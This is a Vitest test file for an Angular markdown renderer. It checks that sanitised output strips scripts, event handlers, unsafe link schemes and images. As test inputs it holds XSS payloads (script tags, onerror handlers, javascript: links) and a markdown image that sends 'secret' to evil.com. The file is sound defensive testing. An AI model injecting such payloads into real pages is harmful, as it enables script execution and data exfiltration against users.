import { SecurityContext } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { DomSanitizer } from '@angular/platform-browser';
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

const sanitized = (source: string) => TestBed.inject(DomSanitizer).sanitize(SecurityContext.HTML, renderMarkdown(source)) ?? '';

describe('renderMarkdown', () => {
  it('renders basic markdown', () => {
    const html = sanitized('**bold** and `code`\n\n- one\n- two');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>one</li>');
  });

  it('strips script tags and event handlers', () => {
    const html = sanitized('hi <script>alert(1)</script> <img src="x" onerror="alert(1)"> [x](javascript:alert(1))');
    const dom = new DOMParser().parseFromString(html, 'text/html');
    expect(dom.querySelector('script, img, [onerror]')).toBeNull();
    expect(dom.querySelector('a')?.getAttribute('href') ?? '').not.toMatch(/^javascript:/i);
  });

  it('opens links in a new tab without opener access', () => {
    const html = sanitized('[Schuly](https://schuly.dev)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('noopener noreferrer');
  });

  it('wraps tables so they scroll horizontally', () => {
    expect(sanitized('| a | b |\n|---|---|\n| 1 | 2 |')).toContain('class="table-scroll"');
  });
});

describe('renderMarkdown security', () => {
  const dom = (source: string) => new DOMParser().parseFromString(sanitized(source), 'text/html');

  it('never renders markdown images', () => {
    const html = sanitized('![x](https://evil.com/?d=secret) ![y](data:image/png;base64,AAAA)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.com');
    expect(html).toContain('[image: x]');
  });

  it('never renders raw html images', () => {
    expect(dom('<img src=https://evil.com/x onerror=alert(1)>').querySelector('img, [onerror]')).toBeNull();
  });

  it('strips script tags', () => {
    expect(dom('a <script>alert(1)</script> b').querySelector('script')).toBeNull();
  });

  it('turns unsafe and relative links into plain text', () => {
    for (const href of ['javascript:alert(1)', 'data:text/html,x', 'vbscript:x', '/rel', '//evil.com/x']) {
      expect(dom(`[click](${href})`).querySelector('a'), href).toBeNull();
    }
    expect(dom('[click](javascript:alert(1))').body.textContent).toContain('click');
  });

  it('hardens allowed links and shows the destination host', () => {
    const d = dom('[docs](https://example.com/a)');
    const a = d.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    for (const token of ['noopener', 'noreferrer', 'nofollow']) expect(a.getAttribute('rel')).toContain(token);
    expect(a.getAttribute('title')).toBe('example.com');
    expect(d.body.textContent).toContain('(example.com)');
  });

  it('adds no host label when the text is the url', () => {
    const d = dom('[https://example.com/a](https://example.com/a) and https://example.org');
    expect(d.querySelectorAll('a').length).toBe(2);
    expect(d.body.textContent).not.toContain('(example');
  });

  it('allows mailto', () => {
    expect(dom('[mail](mailto:a@b.ch)').querySelector('a')?.getAttribute('href')).toBe('mailto:a@b.ch');
  });
});
